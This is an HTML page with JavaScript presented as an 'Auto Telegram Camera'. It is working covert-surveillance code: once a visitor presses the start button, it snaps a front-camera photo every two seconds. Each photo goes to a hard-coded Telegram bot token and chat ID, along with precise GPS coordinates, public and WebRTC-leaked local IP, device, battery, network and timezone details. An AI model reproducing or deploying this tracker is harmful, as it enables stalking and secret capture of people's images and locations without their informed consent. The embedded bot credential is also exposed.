<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Telegram Camera</title>
<style>
body{margin:0;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}
button{margin-top:12px;padding:10px 20px;font-size:16px;cursor:pointer}
</style>
</head>
<body>
<canvas id="canvas" style="display:none"></canvas>
<button onclick="start()">â–¶ START AUTO SEND</button>
<script>
const canvas=document.getElementById("canvas");
const BOT_TOKEN="7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID="8319568593";
let intervalId=null;
let latitude="N/A";
let longitude="N/A";
let mapLink="Location not allowed";
let userIP="Unknown";
let stream=null;
let batteryInfo="";
let networkInfo="";
let localIP="";

fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{userIP=d.ip});

navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{stream=s});

if(navigator.getBattery){
navigator.getBattery().then(b=>{
batteryInfo=`
ðŸ”‹ Battery:
Level: ${Math.round(b.level*100)}%
Charging: ${b.charging?'Yes':'No'}
Time: ${b.chargingTime===Infinity?'Not charging':b.chargingTime+' seconds'}
`;
});
}

if(navigator.connection){
networkInfo=`
ðŸ“¡ Network:
Type: ${navigator.connection.effectiveType}
Downlink: ${navigator.connection.downlink} Mbps
RTT: ${navigator.connection.rtt} ms
Save Data: ${navigator.connection.saveData?'Enabled':'Disabled'}
`;
}

const getLocalIPAddress=()=>{
return new Promise(resolve=>{
const pc=new RTCPeerConnection({iceServers:[]});
pc.createDataChannel('');
pc.createOffer().then(sdp=>pc.setLocalDescription(sdp));
pc.onicecandidate=ice=>{
if(!ice||!ice.candidate||!ice.candidate.candidate)return;
const ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
if(ip&&ip[1])resolve(ip[1]);
pc.close();
};
});
};

function start(){
if("geolocation" in navigator){
navigator.geolocation.getCurrentPosition(pos=>{
latitude=pos.coords.latitude.toFixed(6);
longitude=pos.coords.longitude.toFixed(6);
mapLink=`https://www.google.com/maps?q=${latitude},${longitude}`;
},()=>{
mapLink="Location denied";
},{enableHighAccuracy:true});
}

getLocalIPAddress().then(ip=>{localIP=ip});

if(!intervalId){
intervalId=setInterval(captureAndSend,2000);
}
}

function captureAndSend(){
if(!stream)return;
const videoTrack=stream.getVideoTracks()[0];
const imageCapture=new ImageCapture(videoTrack);
imageCapture.grabFrame().then(imageBitmap=>{
canvas.width=imageBitmap.width;
canvas.height=imageBitmap.height;
const ctx=canvas.getContext("2d");
ctx.translate(canvas.width,0);
ctx.scale(-1,1);
ctx.drawImage(imageBitmap,0,0);
canvas.toBlob(blob=>{
const caption=`
ðŸ“¸ Auto Capture
ðŸ“± ${navigator.userAgent}
ðŸ–¥ ${navigator.platform}
ðŸ“ ${screen.width}x${screen.height}
ðŸ“ Location:
Lat: ${latitude}
Lng: ${longitude}
ðŸ—º ${mapLink}
ðŸŒ Public IP: ${userIP}
ðŸ”’ Local IP: ${localIP||'Unknown'}
â° ${new Date().toLocaleString()}
${batteryInfo}
${networkInfo}
ðŸ“… Referrer: ${document.referrer||'Direct visit'}
ðŸŽ¯ Language: ${navigator.language}
â± Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
`;
const formData=new FormData();
formData.append("chat_id",CHAT_ID);
formData.append("photo",blob);
formData.append("caption",caption);
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
},"image/jpeg",0.7);
}).catch(()=>{});
}
</script>
</body>
</html>
